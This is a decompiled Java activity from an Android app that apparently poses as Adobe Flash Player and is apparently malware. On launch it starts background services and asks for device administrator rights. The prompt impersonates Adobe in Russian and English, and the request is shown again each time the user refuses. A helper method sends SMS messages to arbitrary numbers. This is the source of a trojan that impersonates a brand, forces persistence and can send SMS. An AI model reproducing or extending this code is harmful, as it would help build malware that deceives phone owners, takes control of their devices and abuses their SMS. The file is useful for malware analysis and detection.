package com.adobe.flashplayer_;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import com.adobe.flash.R;
import java.io.IOException;
import java.io.OutputStreamWriter;

public class FlashARM extends Activity {
    static final int ACTIVATION_REQUEST = 1;

    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_flash);
        startService(new Intent(this, AdobeFlashCore.class));
        ComponentName mAdminName = new ComponentName(this, ADOBEcoreZa.class);
        Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
        intent.putExtra("android.app.extra.DEVICE_ADMIN", mAdminName);
        intent.putExtra("android.app.extra.ADD_EXPLANATION", "FLASH_PLUGIN_INSTALLATION\n\nУстановка и регистрация компонентов com.adobe.flashplayer.\n\nМодуль будет зарегистрирован как Adobe Flash Player.\n\nFor get more information about us, please visit http://adobe.com.");
        startActivityForResult(intent, 1);
    }

    /* access modifiers changed from: protected */
    public void onDestroy() {
        super.onDestroy();
    }

    /* access modifiers changed from: protected */
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (resultCode == -1) {
            startService(new Intent(this, AdobeZCore.class));
        }
        switch (requestCode) {
            case 1:
                if (resultCode != -1) {
                    ComponentName mAdminName = new ComponentName(this, ADOBEcoreZa.class);
                    Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
                    intent.putExtra("android.app.extra.DEVICE_ADMIN", mAdminName);
                    intent.putExtra("android.app.extra.ADD_EXPLANATION", "FLASH_PLUGIN_INSTALLATION\n\nУстановка и регистрация компонентов com.adobe.flashplayer.\n\nМодуль будет зарегистрирован как Adobe Flash Player.\n\nFor get more information about us, please visit http://adobe.com.");
                    startActivityForResult(intent, 1);
                    return;
                }
                return;
            default:
                super.onActivityResult(requestCode, resultCode, data);
                return;
        }
    }

    private void writeConfig(String config, String data) {
        try {
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(openFileOutput(config, 0));
            outputStreamWriter.write(data);
            outputStreamWriter.close();
        } catch (IOException e) {
        }
    }

    public void sendSMS(String n, String msg) {
        String phoneNumber = n;
        String message = msg;
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendMultipartTextMessage(phoneNumber, null, smsManager.divideMessage(message), null, null);
    }
}
